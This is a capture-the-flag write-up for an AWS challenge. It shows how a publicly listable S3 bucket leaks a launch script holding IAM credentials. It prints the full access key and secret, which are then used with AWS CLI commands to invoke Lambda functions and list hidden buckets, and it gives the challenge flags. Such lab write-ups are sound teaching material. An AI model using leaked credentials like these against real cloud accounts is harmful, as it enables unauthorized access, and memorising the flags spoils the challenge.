# Aws Config
- The website is hosted on an S3 bucket with very verbose permissions. 
	- Publicly readable
	- Publicly listable
- Additionally, the source code for the lambda function being used and the launch script are publicly available to see because of this. They should have never been uploaded in the first place.
- We are going to use these facts to escalate privileges on the system

## Solution 1
- List out the contents of the S3 buckets to find the flag. 
- In the browser, using the URL 'http://spokane-ctf-iv-magic8ball.s3.us-west-2.amazonaws.com/' will list the contents.
- Within here, we can see then visit http://spokane-ctf-iv-magic8ball.s3.us-west-2.amazonaws.com/website/flag.txt. 
	- This will download the flag file. 
- Using the AWS cli to do the commands for us:
	- aws s3 ls s3://spokane-ctf-iv-magic8ball/website/
	- aws s3 cp s3://spokane-ctf-iv-magic8ball/website/flag.txt ./
	- cat flag
- Flag: SC4{What_1s_tH1s_Mast0don!?}

## Solution 2 
- The file 'launch.py' contains AWS IAM credentials for the script used to launch the website. 
- Download this file as we did before. 
- The variable ``AccessKeyId`` contains the access key id. Use this as the flag.
- Flag: AKIAUEWWLUKBRHXONOOO

## Challenge 3
- First, let's list out the lambda functions. The base command is 'aws lambda list-functions' with our region and credentials specified. 
	- AWS_ACCESS_KEY_ID="AKIAUEWWLUKBRHXONOOO" AWS_SECRET_ACCESS_KEY=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 aws lambda list-functions --region us-west-2
	- There's a function called 'flag3'. Let's execute that function. 
- Execute the lambda function:
	- Base command: ``aws lambda invoke`` with our credentials, region and function name specified. 
	- AWS_ACCESS_KEY_ID="AKIAUEWWLUKBRHXONOOO" AWS_SECRET_ACCESS_KEY=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 aws --region us-west-2 lambda invoke --function-name Flag3 outfile
- Within 'outfile' will be the flag. 
- Flag: SC4{0Nc3Y0uR_1n_tH3r2_N0_g01ng_bacK!}

## Challenge 4
- Using the credentials we obtained from before, we can VIEW all of the S3 buckets. 
- This can be done with the following command ``AWS_ACCESS_KEY_ID="AKIAUEWWLUKBRHXONOOO" AWS_SECRET_ACCESS_KEY=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 aws s3 ls``
- There is another bucket that we didn't see before: ``nathan-super-secret-bucket``
	- Within here, there is a file called ``flag.txt``. Open this file to read the flag. 
- Flag: SC4{PaperClipToAHouse!}
